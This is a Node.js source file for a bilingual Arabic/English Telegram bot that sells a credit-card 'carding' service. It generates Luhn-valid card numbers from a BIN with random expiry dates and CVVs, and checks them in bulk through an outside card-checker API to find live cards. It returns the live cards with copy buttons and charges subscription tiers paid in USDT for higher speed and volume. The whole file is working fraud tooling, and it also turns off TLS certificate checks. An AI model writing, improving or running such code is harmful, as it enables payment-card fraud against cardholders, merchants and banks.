const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
    console.error('❌ TOKEN is required');
    process.exit(1);
}

// تحسين إعدادات البوت للتعامل مع ضغط الرسائل العالي
const bot = new TelegramBot(TOKEN, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: { timeout: 10 }
    } 
});

// وكلاء الاتصال المتطورة لرفع كفاءة الشبكة ومنع التهنيج عند الذروة
const httpAgent = new http.Agent({ 
    keepAlive: true, 
    maxSockets: 2000, 
    maxFreeSockets: 256, 
    timeout: 60000 
});
const httpsAgent = new https.Agent({ 
    keepAlive: true, 
    maxSockets: 2000, 
    maxFreeSockets: 256, 
    timeout: 60000, 
    rejectUnauthorized: false 
});

// ==========================================
// قاعدة بيانات JSON
// ==========================================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    if (!fs.existsSync(DATA_FILE)) return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null };
    try { 
        const content = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(content || '{}') || { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null }; 
    } catch(e) { 
        return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null }; 
    }
}

function saveData(data) { 
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); 
    } catch(e) {
        console.error('Error saving data:', e);
    }
}

function getPlans() {
    const data = loadData();
    if (!data.plans) {
        data.plans = {
            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 40, campaignsLimit: 2, speed: 5 },
            plus: { nameAr: 'Plus', nameEn: 'Plus', price: 3, cardsLimit: 500, campaignsLimit: 4, speed: 30 },
            pro: { nameAr: 'Pro', nameEn: 'Pro', price: 5, cardsLimit: 1500, campaignsLimit: 6, speed: 60 },
            vip: { nameAr: 'VIP', nameEn: 'VIP', price: 8, cardsLimit: 3000, campaignsLimit: 10, speed: 100 }
        };
        saveData(data);
    }
    return data.plans;
}

function updatePlans(newPlans) { const d = loadData(); d.plans = newPlans; saveData(d); }

function getSubscriber(userId) {
    const data = loadData();
    if (!data.subscribers[userId]) {
        data.subscribers[userId] = { plan: 'free', startDate: new Date().toISOString(), endDate: new Date(Date.now() + 365*24*60*60*1000).toISOString() };
        saveData(data);
    }
    const sub = data.subscribers[userId];
    if (sub.plan !== 'free' && new Date(sub.endDate) < new Date()) {
        sub.plan = 'free';
        sub.startDate = new Date().toISOString();
        sub.endDate = new Date(Date.now() + 365*24*60*60*1000).toISOString();
        saveData(data);
    }
    return sub;
}

function updateSubscriber(userId, updates) { const d = loadData(); d.subscribers[userId] = { ...d.subscribers[userId], ...updates }; saveData(d); }
function getAllSubscribers() { return loadData().subscribers; }
function getUserActiveCampaigns(userId) { return Object.values(loadData().campaigns).filter(c => c.userId === userId && c.status === 'running'); }
function createCampaign(userId, bin, total) { const d = loadData(); const id = Date.now() + Math.random(); d.campaigns[id] = { id, userId, bin, total, current: 0, hit: 0, status: 'running', createdAt: new Date().toISOString() }; saveData(d); return id; }
function updateCampaign(campaignId, current, hit, status) { const d = loadData(); if (d.campaigns[campaignId]) { if (current !== undefined) d.campaigns[campaignId].current = current; if (hit !== undefined) d.campaigns[campaignId].hit = hit; if (status !== undefined) d.campaigns[campaignId].status = status; saveData(d); } }
function createPendingPayment(userId, plan, code) { const d = loadData(); const p = getPlans()[plan]; d.pendingPayments.push({ id: Date.now() + Math.random(), userId, plan, amount: p.price, code, status: 'waiting_payment', createdAt: new Date().toISOString() }); saveData(d); }
function getPendingPayment(userId, plan) { return loadData().pendingPayments.find(p => p.userId === userId && p.plan === plan && p.status === 'waiting_payment'); }
function updatePendingPayment(id, status) { const d = loadData(); const idx = d.pendingPayments.findIndex(p => p.id === id); if (idx !== -1) d.pendingPayments[idx].status = status; saveData(d); }
function createPaymentProof(userId, plan, photoFileId, messageId) { const d = loadData(); const proof = { id: Date.now() + Math.random(), userId, plan, photoFileId, messageId, status: 'pending', createdAt: new Date().toISOString() }; d.paymentProofs.push(proof); saveData(d); return proof; }
function getPaymentProof(id) { return loadData().paymentProofs.find(p => p.id === id); }
function updatePaymentProof(id, status) { const d = loadData(); const idx = d.paymentProofs.findIndex(p => p.id === id); if (idx !== -1) d.paymentProofs[idx].status = status; saveData(d); }

// ==========================================
// المتغيرات العامة
// ==========================================
const userLang = new Map();
const adminSet = new Set([643309456]);
const userStates = new Map();
const activeJobs = new Map();
const BINANCE_PAY_ID = '842505320';

// ==========================================
// دوال مساعدة
// ==========================================
const countryFlags = { 'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸', 'united kingdom': '🇬🇧', 'uk': '🇬🇧', 'britain': '🇬🇧', 'saudi arabia': '🇸🇦', 'ksa': '🇸🇦', 'saudi': '🇸🇦', 'egypt': '🇪🇬', 'uae': '🇦🇪', 'kuwait': '🇰🇼', 'qatar': '🇶🇦', 'bahrain': '🇧🇭', 'oman': '🇴🇲', 'jordan': '🇯🇴', 'lebanon': '🇱🇧', 'iraq': '🇮🇶', 'syria': '🇸🇾', 'palestine': '🇵🇸', 'turkey': '🇹🇷', 'germany': '🇩🇪', 'france': '🇫🇷', 'italy': '🇮🇹', 'spain': '🇪🇸', 'netherlands': '🇳🇱', 'belgium': '🇧🇪', 'switzerland': '🇨🇭', 'austria': '🇦🇹', 'russia': '🇷🇺', 'china': '🇨🇳', 'japan': '🇯🇵', 'south korea': '🇰🇷', 'india': '🇮🇳', 'brazil': '🇧🇷', 'canada': '🇨🇦', 'mexico': '🇲🇽', 'australia': '🇦🇺', 'indonesia': '🇮🇩', 'malaysia': '🇲🇾', 'singapore': '🇸🇬', 'thailand': '🇹🇭', 'vietnam': '🇻🇳', 'philippines': '🇵🇭', 'pakistan': '🇵🇰', 'bangladesh': '🇧🇩', 'south africa': '🇿🇦', 'nigeria': '🇳🇬', 'morocco': '🇲🇦', 'algeria': '🇩🇿', 'tunisia': '🇹🇳', 'libya': '🇱🇾', 'sudan': '🇸🇩', 'yemen': '🇾🇪' };
function getFlag(cn) { if (!cn) return '🌍'; const l = cn.toLowerCase(); for (const [k, f] of Object.entries(countryFlags)) if (l.includes(k)) return f; return '🌍'; }
function getCardType(cn) { if(!cn) return 'بطاقة ائتمانية'; const f=cn[0], t=cn.slice(0,2), fo=cn.slice(0,4); if(f==='4') return 'فيزا كارد'; if(t>='51'&&t<='55') return 'ماستر كارد'; if(t==='34'||t==='37') return 'امريكان اكسبريس'; if(fo==='6011'||t==='65'||(t>='64'&&t<='65')) return 'ديسكفر'; if(t==='35') return 'جيه سي بي'; if(t==='30'||t==='36'||t==='38'||t==='39') return 'دينرز كلوب'; if(t==='50') return 'ميركاتيل'; if(t==='56'||t==='57'||t==='58') return 'مايسترو'; return 'بطاقة ائتمانية'; }
function checkLuhn(card) { let sum=0, alt=false; for(let i=card.length-1;i>=0;i--){ let d=parseInt(card[i],10); if(isNaN(d)) continue; if(alt){ d*=2; if(d>9) d-=9; } sum+=d; alt=!alt; } return sum%10===0; }
function randMonth() { return String(Math.floor(Math.random()*12)+1).padStart(2,'0'); }
function randYear() { return String(new Date().getFullYear() + Math.floor(Math.random()*5)); }
function randCVV() { return String(Math.floor(Math.random()*900)+100); }
function genCardNumber(bin, len=16) { let card=bin; while(card.length<len-1) card+=Math.floor(Math.random()*10); for(let i=0;i<=9;i++){ const t=card+i; if(checkLuhn(t)) return t; } return card+'0'; }
function genFullVisa(bin) { return `${genCardNumber(bin)}|${randMonth()}|${randYear()}|${randCVV()}`; }
function genRandomCode() { return Math.random().toString(36).substring(2,10).toUpperCase(); }

async function checkSingleCard(cardString, chatId, isSilent=false, retries=2) { 
    try { 
        const r=await axios.post('https://api.chkr.cc/',{data:cardString},{
            headers:{'User-Agent':'Mozilla/5.0','Content-Type':'application/json'},
            timeout:20000, 
            httpAgent: httpAgent, 
            httpsAgent: httpsAgent
        }); 
        const d=r.data; 
        if(!d) return { isLive: false };
        const live=(d.code===1 || (d.status && d.status.toLowerCase().includes('live'))); 
        if(!live && !isSilent) return null; 
        return { 
            isLive:live, 
            status:d.status||'غير معروف', 
            message:(d.message||'').replace(/احذفها/gi,'').trim(), 
            type:(d.card&&d.card.type)||getCardType(cardString.split('|')[0]), 
            country:(d.card&&d.card.country&&d.card.country.name)||'غير معروف' 
        }; 
    } catch(e){ 
        if(retries>0){ 
            await new Promise(res => setTimeout(res, 2000)); 
            return checkSingleCard(cardString,chatId,isSilent,retries-1); 
        } 
        if(!isSilent){ 
            const l=userLang.get(chatId)||'ar'; 
            await bot.sendMessage(chatId,translations[l].api_error).catch(() => {}); 
        } 
        return { isLive: false }; 
    } 
}

function getCopyButtons(fullCard, lang) { const [num,month,year,cvv]=fullCard.split('|'); const d=translations[lang]; return { reply_markup:{ inline_keyboard:[[{text:d.btn_copy_full,callback_data:`copy_full_${fullCard}`}],[{text:d.btn_copy_num,callback_data:`copy_num_${num}`}],[{text:d.btn_copy_exp,callback_data:`copy_exp_${month}|${year}`}],[{text:d.btn_copy_cvv,callback_data:`copy_cvv_${cvv}`}]] } }; }
function formatProgressBar(percent, width=10) { const filled=Math.round(percent/100*width); return '▰'.repeat(filled)+'▱'.repeat(width-filled); }
function buildProgressText(campaignsData, speedPercent) { let txt=`🔄 جاري إنشاء الفيزا\nالسرعة: ${speedPercent}%\n`; for(const d of campaignsData){ const pct=d.total>0?(d.current/d.total*100):0; const bar=formatProgressBar(pct); const rem=d.total-d.current; txt+=`\nالمنفذ: ${d.bin}\n${bar} ${pct.toFixed(1)}%\nالعد التنازلي: ${rem} بطاقة متبقية\n`; } txt+='\n━━━━━━━━━━━━━━'; return txt; }

// ==========================================
// تشغيل حملات متعددة بالتوازي (بدون توقف)
// ==========================================
async function runMultipleCampaignsParallel(chatId, binsList, totalCardsPerBin) {
    const subscriber = getSubscriber(chatId);
    const planName = subscriber.plan;
    const plans = getPlans();
    const allowedCampaigns = plans[planName].campaignsLimit;
    const speedPercent = plans[planName].speed;
    const dict = translations[userLang.get(chatId) || 'ar'];

    if (binsList.length > allowedCampaigns) {
        await bot.sendMessage(chatId, dict.campaigns_limit_reached.replace('{limit}', allowedCampaigns));
        return;
    }

    if (activeJobs.has(chatId)) {
        await bot.sendMessage(chatId, '⚠️ هناك حملات جارية حالياً. استخدم /cancel أولاً.');
        return;
    }
    activeJobs.set(chatId, { cancel: false });

    const campaignsData = [];
    for (const bin of binsList) {
        const cid = createCampaign(chatId, bin, totalCardsPerBin);
        campaignsData.push({ bin, cid, total: totalCardsPerBin, current: 0, hit: 0 });
    }

    let progressMsg = await bot.sendMessage(chatId, buildProgressText(campaignsData, speedPercent), {
        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] }
    });

    let lastEdit = 0;
    const updateProgress = async (force = false) => {
        if (activeJobs.get(chatId)?.cancel && !force) return;
        const now = Date.now();
        if (!force && now - lastEdit < 4000) return; 
        lastEdit = now;
        const newText = buildProgressText(campaignsData, speedPercent);
        try {
            await bot.editMessageText(newText, { chat_id: chatId, message_id: progressMsg.message_id,
                reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] } });
        } catch(e) {}
    };

    const runSingle = async (camp) => {
        const bin = camp.bin;
        const total = camp.total;
        // زيادة عدد المنافذ الوهمية لتسريع المعالجة المتوازية
        const numPorts = Math.max(2, Math.min(15, Math.floor(speedPercent / 8) + 1));
        const cardsPerPort = Math.floor(total / numPorts);
        const remainder = total % numPorts;

        const allVisas = [];
        for (let i = 0; i < total; i++) allVisas.push(genFullVisa(bin));

        const portVisas = [];
        let start = 0;
        for (let p = 0; p < numPorts; p++) {
            const cnt = (p === numPorts-1) ? cardsPerPort + remainder : cardsPerPort;
            if (cnt <= 0) continue;
            portVisas.push(allVisas.slice(start, start+cnt));
            start += cnt;
        }

        const portResults = await Promise.all(portVisas.map(async (visas) => {
            let portHit = 0;
            const batchSize = speedPercent > 50 ? 8 : 4; 
            const delayMs = speedPercent <= 10 ? 2000 : (speedPercent <= 50 ? 800 : 200);
            
            for (let i = 0; i < visas.length; i += batchSize) {
                if (activeJobs.get(chatId)?.cancel) break;
                const batch = visas.slice(i, i+batchSize);
                const results = await Promise.all(batch.map(v => checkSingleCard(v, chatId, true)));
                
                for (let j=0; j<results.length; j++) {
                    const res = results[j];
                    if (res && res.isLive) {
                        portHit++;
                        camp.hit++;
                        const flag = getFlag(res.country);
                        const cardType = getCardType(batch[j].split('|')[0]);
                        const liveText = dict.live_result
                            .replace('{card}', batch[j])
                            .replace('{type}', cardType)
                            .replace('{country}', res.country)
                            .replace('{flag}', flag);
                        const buttons = getCopyButtons(batch[j], userLang.get(chatId)||'ar');
                        await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons }).catch(() => {});
                    }
                }
                camp.current = Math.min(camp.current + batch.length, camp.total);
                await updateProgress();
                if (delayMs > 0) await new Promise(r => setTimeout(r, delayMs));
            }
            return portHit;
        }));
        const totalHits = portResults.reduce((a,b)=>a+b,0);
        updateCampaign(camp.cid, camp.total, totalHits, 'completed');
        return totalHits;
    };

    const allHits = await Promise.all(campaignsData.map(c => runSingle(c)));
    const totalHits = allHits.reduce((a,b)=>a+b,0);

    await updateProgress(true);
    try { await bot.deleteMessage(chat_id = chatId, message_id = progressMsg.message_id); } catch(e) {}
    activeJobs.delete(chatId);

    const totalRequested = binsList.length * totalCardsPerBin;
    if (totalHits === 0) {
        const noLive = dict.no_live_found.replace('{total}', totalRequested);
        const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
        await bot.sendMessage(chatId, noLive, keyboard);
    } else {
        await bot.sendMessage(chatId, dict.summary.replace('{hit}', totalHits).replace('{total}', totalRequested));
    }
    userStates.delete(chatId);
}

// ==========================================
// دوال الاشتراكات والقوائم
// ==========================================
async function handleSubscription(chatId, plan) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const subscriber = getSubscriber(chatId);
    const plans = getPlans();
    if (subscriber.plan === plan) {
        await bot.sendMessage(chatId, dict.already_subscribed.replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`]));
        return;
    }
    const code = genRandomCode();
    createPendingPayment(chatId, plan, code);
    const text = dict.subscribe_confirm
        .replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`])
        .replace('{amount}', plans[plan].price)
        .replace('{payId}', BINANCE_PAY_ID)
        .replace('{code}', code);
    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}

async function showMainMenu(chatId) {
    const lang = userLang.get(chatId)||'ar', dict=translations[lang];
    const kb = { inline_keyboard: [[{text:dict.btn_guess,callback_data:'menu_guess'}],[{text:dict.btn_single,callback_data:'menu_single'}],[{text:dict.btn_subscribe,callback_data:'menu_subscribe'}],[{text:dict.btn_my_campaigns,callback_data:'menu_my_campaigns'}]] };
    if(adminSet.has(chatId)) kb.inline_keyboard.push([{text:'⚙️ إدارة البوت',callback_data:'admin_panel'}]);
    await bot.sendMessage(chatId, dict.main_menu, { reply_markup: kb, parse_mode: 'Markdown' }).catch(() => {});
}
async function showSubscriptionMenu(chatId) {
    const lang=userLang.get(chatId)||'ar', dict=translations[lang], plans=getPlans();
    const btns=[]; for(const [k,p] of Object.entries(plans)) if(k!=='free') btns.push([{text:`${p[`name${lang==='ar'?'Ar':'En'}`]} - ${p.price} USDT`,callback_data:`sub_${k}`}]);
    btns.push([{text:dict.cancel_btn,callback_data:'cancel'}]);
    await bot.sendMessage(chatId, dict.subscription_plans, { reply_markup: { inline_keyboard: btns } });
}
async function showMyCampaigns(chatId) {
    const lang=userLang.get(chatId)||'ar', dict=translations[lang], camps=getUserActiveCampaigns(chatId);
    if(camps.length===0){ await bot.sendMessage(chatId, dict.no_active_campaigns); return; }
    let txt=dict.active_campaigns; const btns=[];
    for(const c of camps){ txt+=`\n📌 BIN: ${c.bin} | Progress: ${c.current}/${c.total} | Hits: ${c.hit}`; btns.push([{text:`إيقاف الحملة ${c.id}`,callback_data:`stop_camp_${c.id}`}]); }
    btns.push([{text:dict.new_campaign_btn,callback_data:'menu_guess'}]);
    await bot.sendMessage(chatId, txt, { reply_markup: { inline_keyboard: btns } });
}
async function showAdminPanel(chatId) {
    await bot.sendMessage(chatId, '⚙️ لوحة تحكم الأدمن', { reply_markup: { inline_keyboard: [
        [{text:'💰 تعديل الأسعار',callback_data:'admin_edit_prices'}],[{text:'⚡ تعديل السرعة',callback_data:'admin_edit_speed'}],[{text:'➕ إضافة خطة جديدة',callback_data:'admin_add_plan'}],[{text:'🎁 منح اشتراك',callback_data:'admin_grant'}],[{text:'❌ إلغاء اشتراك',callback_data:'admin_remove'}],[{text:'📋 عرض الأعضاء',callback_data:'admin_list'}],[{text:'🔙 رجوع',callback_data:'main_menu'}]
    ] } });
}

// ==========================================
// أوامر البوت
// ==========================================
bot.onText(/\/start/, async (msg) => { const cid=msg.chat.id; await bot.sendMessage(cid, 'اختر لغتك / Choose your language:', { reply_markup:{ inline_keyboard:[[{text:'العربية',callback_data:'lang_ar'},{text:'English',callback_data:'lang_en'}]] } }); });
bot.onText(/\/menu/, async (msg) => { await showMainMenu(msg.chat.id); });
bot.onText(/\/cancel/, async (msg) => { const cid=msg.chat.id; if(activeJobs.has(cid)){ activeJobs.get(cid).cancel=true; activeJobs.delete(cid); await bot.sendMessage(cid, '❌ تم إلغاء جميع الحملات الجارية.'); } else await bot.sendMessage(cid, '⚠️ لا توجد حملات نشطة.'); });
bot.onText(/\/addadmin (.+)/, async (msg, match) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; const id=parseInt(match[1]); if(!isNaN(id)) adminSet.add(id); await bot.sendMessage(cid, `✅ تم إضافة أدمن ${id}`); });
bot.onText(/\/removeadmin (.+)/, async (msg, match) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; const id=parseInt(match[1]); if(id===643309456){ await bot.sendMessage(cid,'⚠️ لا يمكن إزالة الأدمن الأساسي'); return; } adminSet.delete(id); await bot.sendMessage(cid,`✅ تم إزالة أدمن ${id}`); });
bot.onText(/\/admins/, async (msg) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; await bot.sendMessage(cid, `📋 الأدمن: ${Array.from(adminSet).join(', ')}`); });

// ==========================================
// معالجة الأزرار
// ==========================================
bot.on('callback_query', async (query) => {
    const cid=query.message.chat.id, data=query.data, lang=userLang.get(cid)||'ar', dict=translations[lang];
    await bot.answerCallbackQuery(query.id).catch(() => {});
    
    if(data.startsWith('copy_full_')){ await bot.sendMessage(cid,`\`${data.replace('copy_full_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data.startsWith('copy_num_')){ await bot.sendMessage(cid,`\`${data.replace('copy_num_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data.startsWith('copy_exp_')){ await bot.sendMessage(cid,`\`${data.replace('copy_exp_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data.startsWith('copy_cvv_')){ await bot.sendMessage(cid,`\`${data.replace('copy_cvv_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data==='lang_ar'){ userLang.set(cid,'ar'); await bot.sendMessage(cid,'✅ تم تغيير اللغة إلى العربية'); await showMainMenu(cid); return; }
    if(data==='lang_en'){ userLang.set(cid,'en'); await bot.sendMessage(cid,'✅ Language changed to English'); await showMainMenu(cid); return; }
    if(data==='menu_guess'){ userStates.set(cid,{step:'awaiting_bin',bins:[],defaultCount:null}); await bot.sendMessage(cid, dict.enter_bin, { parse_mode:'Markdown' }); return; }
    if(data==='menu_single'){ await bot.sendMessage(cid, dict.single_invalid, { parse_mode:'Markdown' }); return; }
    if(data==='menu_subscribe'){ await showSubscriptionMenu(cid); return; }
    if(data==='menu_my_campaigns'){ await showMyCampaigns(cid); return; }
    if(data==='add_another_bin'){ const st=userStates.get(cid); if(st){ const sub=getSubscriber(cid), plans=getPlans(), maxC=plans[sub.plan].campaignsLimit; if(st.bins.length>=maxC){ await bot.sendMessage(cid, `⚠️ لقد وصلت إلى الحد الأقصى للحملات (${maxC}).`); return; } st.step='awaiting_bin'; await bot.sendMessage(cid,'📌 أرسل الـ BIN التالي:'); } return; }
    if(data==='set_default_count'){ const st=userStates.get(cid); if(st && st.bins.length>0){ st.step='awaiting_default_count'; await bot.sendMessage(cid,'🔢 أدخل العدد لكل حملة:'); } return; }
    if(data==='start_with_default'){ const st=userStates.get(cid); if(st && st.bins.length>0 && st.defaultCount){ st.step='running'; await runMultipleCampaignsParallel(cid, st.bins, st.defaultCount); } return; }
    if(data==='cancel_all_campaigns'){ if(activeJobs.has(cid)){ activeJobs.get(cid).cancel=true; activeJobs.delete(cid); await bot.sendMessage(cid,'❌ تم الإلغاء.'); } return; }
    if(data==='cancel'){ await showMainMenu(cid); return; }
    if(data.startsWith('stop_camp_')){ const campId=parseFloat(data.split('_')[2]); updateCampaign(campId,null,null,'stopped'); await bot.sendMessage(cid, dict.campaign_stopped.replace('{id}',campId)); return; }
    if(data.startsWith('sub_')){ await handleSubscription(cid, data.replace('sub_','')); return; }
    if(data==='admin_panel'){ if(adminSet.has(cid)) await showAdminPanel(cid); return; }
    if(data==='admin_edit_prices'){ userStates.set(cid,{step:'admin_edit_price'}); await bot.sendMessage(cid,'أرسل: plan=price'); return; }
    if(data==='admin_edit_speed'){ userStates.set(cid,{step:'admin_edit_speed'}); await bot.sendMessage(cid,'أرسل: plan=speed'); return; }
    if(data==='admin_add_plan'){ userStates.set(cid,{step:'admin_add_plan'}); await bot.sendMessage(cid,'أرسل: name_ar|name_en|price|cardsLimit|campaignsLimit|speed'); return; }
    if(data==='admin_grant'){ userStates.set(cid,{step:'admin_grant'}); await bot.sendMessage(cid,'أرسل: user_id plan'); return; }
    if(data==='admin_remove'){ userStates.set(cid,{step:'admin_remove'}); await bot.sendMessage(cid,'أرسل معرف المستخدم'); return; }
    if(data==='admin_list'){ const subs=getAllSubscribers(); let msg='📋 الأعضاء:\n'; for(const [id,sub] of Object.entries(subs)) msg+=`🆔 ${id} | ${sub.plan}\n`; await bot.sendMessage(cid, msg); return; }
    if(data.startsWith('approve_payment_')||data.startsWith('reject_payment_')){
        const parts=data.split('_'), action=parts[0], proofId=parseFloat(parts[2]), proof=getPaymentProof(proofId);
        if(proof){
            if(action==='approve'){
                const end=new Date(); end.setMonth(end.getMonth()+1);
                updateSubscriber(proof.userId,{plan:proof.plan,startDate:new Date().toISOString(),endDate:end.toISOString()});
                updatePaymentProof(proofId,'approved');
                const ul=userLang.get(proof.userId)||'ar';
                await bot.sendMessage(proof.userId, translations[ul].payment_approved.replace('{plan}',proof.plan));
                await bot.sendMessage(cid,`✅ تم التفعيل لـ ${proof.userId}`);
            } else {
                updatePaymentProof(proofId,'rejected');
                await bot.sendMessage(proof.userId, translations[userLang.get(proof.userId)||'ar'].payment_rejected);
            }
        }
    }
});

// ==========================================
// معالجة الرسائل النصية
// ==========================================
bot.on('message', async (msg) => {
    const cid=msg.chat.id, text=msg.text;
    if(!text && !msg.photo) return;
    if(text && text.startsWith('/')) return;
    const lang=userLang.get(cid)||'ar', dict=translations[lang];
    const state=userStates.get(cid);

    if(msg.photo){
        const pendingItem=Object.values(loadData().pendingPayments).reverse().find(p=>p.userId===cid && p.status==='waiting_payment');
        if(pendingItem){
            const fileId=msg.photo[msg.photo.length-1].file_id;
            const proof=createPaymentProof(cid, pendingItem.plan, fileId, msg.message_id);
            const caption=`📸 إثبات دفع\nمن: ${cid}\nخطة: ${pendingItem.plan}\nكود: ${pendingItem.code}`;
            const kb={ reply_markup:{ inline_keyboard:[[{text:'✅ موافقة',callback_data:`approve_payment_${proof.id}`},{text:'❌ رفض',callback_data:`reject_payment_${proof.id}`}]] } };
            for(const adminId of adminSet) await bot.sendPhoto(adminId, fileId, { caption, ...kb }).catch(() => {});
            await bot.sendMessage(cid, dict.payment_received);
            updatePendingPayment(pendingItem.id, 'proof_sent');
        }
        return;
    }

    if(state && state.step==='awaiting_bin'){
        if(/^\d{5,16}/.test(text)){
            const bin=text.slice(0,6);
            state.currentBin=bin;
            if(state.defaultCount){
                state.bins.push(bin);
                const sub=getSubscriber(cid), plans=getPlans(), maxC=plans[sub.plan].campaignsLimit;
                let btns=[[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}]];
                if(state.bins.length < maxC) btns.unshift([{text:'➕ BIN آخر',callback_data:'add_another_bin'}]);
                await bot.sendMessage(cid, `✅ أضيف BIN: ${bin}\nالإجمالي: ${state.bins.length}`, { reply_markup: { inline_keyboard: btns } });
                state.step='awaiting_decision';
            } else {
                state.step='awaiting_count';
                await bot.sendMessage(cid, `🔢 كم عدد الفيزات لـ ${bin}؟ (الأقصى ${getSubscriber(cid).cardsLimit})`);
            }
        }
        return;
    }

    if(state && state.step==='awaiting_count'){
        const count=parseInt(text);
        if(!isNaN(count) && count >= 5){
            const max = getSubscriber(cid).cardsLimit;
            if(count > max && !adminSet.has(cid)){
                await bot.sendMessage(cid, dict.count_out_of_range.replace('{max}', max));
                return;
            }
            state.bins.push(state.currentBin);
            state.defaultCount=count;
            state.step='awaiting_decision';
            await bot.sendMessage(cid, `✅ تم الإعداد.`, { reply_markup: { inline_keyboard: [[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:'➕ BIN آخر',callback_data:'add_another_bin'}]] } });
        }
        return;
    }

    if(state && state.step==='admin_grant'){
        const [uId, plan] = text.split(' ');
        if(uId && plan){
            const end=new Date(); end.setMonth(end.getMonth()+1);
            updateSubscriber(uId, {plan: plan, startDate: new Date().toISOString(), endDate: end.toISOString()});
            await bot.sendMessage(cid, `✅ تم منح ${plan} لـ ${uId}`);
        }
        return;
    }

    if(text && text.includes('|')){
        await bot.sendMessage(cid, dict.single_checking);
        const res=await checkSingleCard(text,cid);
        if(res && res.isLive){
            const flag=getFlag(res.country);
            const liveText=dict.live_result.replace('{card}',text).replace('{type}',getCardType(text)).replace('{country}',res.country).replace('{flag}',flag);
            await bot.sendMessage(cid, liveText, { parse_mode:'Markdown', ...getCopyButtons(text,lang) });
        } else {
            await bot.sendMessage(cid, '❌ البطاقة ديك (DIE) أو خطأ في الفحص.');
        }
        return;
    }
});

const translations = {
    ar: {
        main_menu: '✨ *القائمة الرئيسية* ✨',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        btn_subscribe: '💎 الاشتراكات',
        btn_my_campaigns: '📋 حملاي النشطة',
        cancel_btn: '❌ إلغاء',
        btn_copy_full: '📋 نسخ كاملة',
        btn_copy_num: '🔢 الرقم',
        btn_copy_exp: '📅 التاريخ',
        btn_copy_cvv: '🔐 CVV',
        enter_bin: '📌 أرسل الـ BIN (أول 6 أرقام):',
        count_out_of_range: '⚠️ الحد الأقصى لخطة هو {max}.',
        live_result: '✅ تعمل بنجاح ✅\n\n💳 {card}\n📊 الحالة: LIVE\n🏦 النوع: {type}\n🌍 البلد: {country} {flag}',
        no_live_found: '😞 لم يتم العثور على صالح من {total}.',
        new_campaign_btn: '🚀 حملة جديدة',
        summary: '📊 *الملخص*\n✅ صالحة: {hit}\n🎯 المجموع: {total}',
        single_invalid: '📌 أرسل: `رقم|شهر|سنة|cvv`',
        single_checking: '⏳ جاري الفحص...',
        api_error: '⚠️ خطأ في الاتصال بالخدمة.',
        subscription_plans: '💎 *خطط الاشتراك*:',
        payment_received: '📸 تم استلام الإثبات، سيتم التفعيل قريباً.',
        payment_approved: '🎉 تم تفعيل خطة {plan}!',
        payment_rejected: '❌ تم رفض الإثبات.',
        campaigns_limit_reached: '⚠️ حدك الأقصى هو {limit} حملات.',
        campaign_stopped: '🛑 توقفت الحملة {id}.',
        no_active_campaigns: '⚠️ لا توجد حملات جارية.',
        active_campaigns: '📋 حملاتك الجارية:',
        subscribe_confirm: '✅ خطة {plan}\nحوّل {amount} USDT لـ:\n`{payId}`\nكود: `{code}`\nأرسل الصورة هنا.'
    },
    en: {
        main_menu: '✨ *Main Menu* ✨',
        btn_guess: '🎲 Guess Cards',
        btn_single: '🔍 Check Single',
        btn_subscribe: '💎 Subscription',
        btn_my_campaigns: '📋 Active Campaigns',
        cancel_btn: '❌ Cancel',
        btn_copy_full: '📋 Copy All',
        btn_copy_num: '🔢 Number',
        btn_copy_exp: '📅 Expiry',
        btn_copy_cvv: '🔐 CVV',
        enter_bin: '📌 Send BIN (6 digits):',
        count_out_of_range: '⚠️ Max limit is {max}.',
        live_result: '✅ LIVE SUCCESS ✅\n\n💳 {card}\n📊 Status: LIVE\n🏦 Type: {type}\n🌍 Country: {country} {flag}',
        no_live_found: '😞 No live cards in {total}.',
        new_campaign_btn: '🚀 New Campaign',
        summary: '📊 *Summary*\n✅ Live: {hit}\n🎯 Total: {total}',
        single_invalid: '📌 Format: `num|mm|yyyy|cvv`',
        single_checking: '⏳ Checking...',
        api_error: '⚠️ API Error.',
        subscription_plans: '💎 *Plans*:',
        payment_received: '📸 Proof received, pending review.',
        payment_approved: '🎉 {plan} Activated!',
        payment_rejected: '❌ Proof rejected.',
        campaigns_limit_reached: '⚠️ Max {limit} campaigns.',
        campaign_stopped: '🛑 Stopped {id}.',
        no_active_campaigns: '⚠️ No campaigns.',
        active_campaigns: '📋 Your Campaigns:',
        subscribe_confirm: '✅ {plan}\nSend {amount} USDT to:\n`{payId}`\nCode: `{code}`\nSend photo.'
    }
};
